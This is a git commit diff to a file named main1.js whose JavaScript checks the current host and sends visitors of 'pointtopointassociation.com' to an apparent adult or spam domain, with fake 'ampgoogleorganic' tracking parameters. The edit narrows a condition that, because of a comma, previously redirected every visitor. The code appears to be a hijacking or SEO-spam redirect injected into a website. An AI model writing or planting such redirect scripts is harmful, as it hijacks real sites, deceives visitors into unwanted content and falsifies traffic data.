2a2eb0590478ce1893870d0b48bc0bb3e48d33af
Galuhput96 <91706295+Galuhput96@users.noreply.github.com>
2025-01-12 20:23:55 +0700

    Update main1.js

--- main1.js
+++ main1.js
@@ -1,3 +1,3 @@
- if (window.location.host === 'betaswift.com','pointtopointassociation.com') {
+ if (window.location.host === 'pointtopointassociation.com') {
         window.location.href = 'https://igobokep.lol/?utm_medium=ampgoogleorganic&utm_source=igobokep';
     }
